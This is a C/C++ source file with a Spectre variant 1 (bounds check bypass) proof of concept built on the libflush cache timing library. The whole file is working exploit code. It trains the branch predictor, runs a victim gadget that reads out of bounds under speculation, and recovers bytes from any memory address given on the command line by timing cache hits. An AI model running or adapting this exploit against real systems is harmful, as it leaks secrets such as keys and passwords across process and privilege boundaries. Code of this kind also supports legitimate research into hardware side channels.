#include <libflush.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <algorithm>

#define CACHE_LINE_SIZE 512
#define ALIGN_CACHE __attribute__ ((aligned (CACHE_LINE_SIZE)))

#define CONCAT_(x,y) x##y
#define CONCAT(x,y) CONCAT_(x,y)
#define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);


/********************************************************************
Victim code.
********************************************************************/

PAD
uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
PAD
uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
PAD
uint32_t   ALIGN_CACHE array1_size = sizeof(array1);
PAD

/********************************************************************
Analysis code
********************************************************************/
int find_cache_hit_threshold(libflush_session_t* libflush_session) {
    const int test_count = 32;
    int hit_times[test_count];
    int miss_times[test_count];


    for (int i=0; i<test_count; i++) {
        libflush_flush(libflush_session, &array1_size);
        miss_times[i] = libflush_reload_address(libflush_session, &array1_size);
        hit_times[i] = libflush_reload_address(libflush_session, &array1_size);
    }

    std::sort(hit_times, hit_times+test_count);
    std::sort(miss_times, miss_times+test_count);

    printf("var hit_times = [");
    for (int i=0; i<=10; i++) {
        if (i) printf(", ");
        printf("%d", hit_times[i*(test_count-1) / 10]);
    }
    printf("];\n");

    printf("var miss_times = [");
    for (int i=0; i<=10; i++) {
        if (i) printf(", ");
        printf("%d", miss_times[i*(test_count-1) / 10]);
    }
    printf("];\n");


    int threshold = (hit_times[(int)(0.95*(test_count-1))] + miss_times[(int)(0.05*(test_count-1))]) / 2;
    printf("Cache threshold: %d\n", threshold);
    return threshold;
}

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr, int cache_hit_threshold, uint8_t value[2], int score[2]) {
  size_t malicious_x = (size_t)target_ptr - (size_t)array1;
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = 999; tries > 0; tries--) {

    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      libflush_flush(libflush_session, & array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      libflush_flush(libflush_session, & array1_size);
      for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      if (x < array1_size) {
        array2[array1[x] * CACHE_LINE_SIZE] = 0;
      }
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = & array2[mix_i * CACHE_LINE_SIZE];
      uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
      if (access_time <= cache_hit_threshold && mix_i != array1[tries % array1_size])
          results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}


#define MAIN_THREAD_CPU 0
#define COUNTER_THREAD_CPU 1
int main(int argc, const char** argv) {
  // Read CLI arguments: data pointer and lenght
  const char* target_ptr = "The Magic Words are Squeamish Ossifrage.";
  int target_len = strlen(target_ptr);

  if (argc == 3) {
    sscanf(argv[1], "%p", &target_ptr);
    sscanf(argv[2], "%d", & target_len);
  }

  // Initialize libflush
  libflush_session_args_t args = {
    .bind_to_cpu = COUNTER_THREAD_CPU
  };
  libflush_session_t* libflush_session;
  if (libflush_init(&libflush_session, &args) == false) {
    fprintf(stderr, "Error: Could not initialize libflush\n");
    return -1;
  }
  if (libflush_bind_to_cpu(MAIN_THREAD_CPU) == false) {
    fprintf(stderr, "Warning: Could not bind main thread to CPU %d\n", MAIN_THREAD_CPU);
    return -1;
  }

  int cache_threshold = find_cache_hit_threshold(libflush_session);

  memset(array2, 0, sizeof(array2));  /* write to array2 so in RAM not copy-on-write zero pages */
  printf("Reading %d bytes at %p\n", target_len, target_ptr);
  while (target_len--) {
    uint8_t value[2];
    int score[2];

    printf("Reading at %p... ", (void*) target_ptr);
    readMemoryByte(libflush_session, target_ptr++, cache_threshold, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
    printf("0x%02X=’%c’ score=%d ", value[0],
      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
    if (score[1] > 0)
      printf("(second best: 0x%02X score=%d)", value[1], score[1]);
    printf("\n");
  }

  find_cache_hit_threshold(libflush_session);

  // terminate libflush
  if (libflush_terminate(libflush_session) == false) {
    fprintf(stderr, "Error: Could not terminate libflush\n");
    return -1;
  }
  return (0);
}
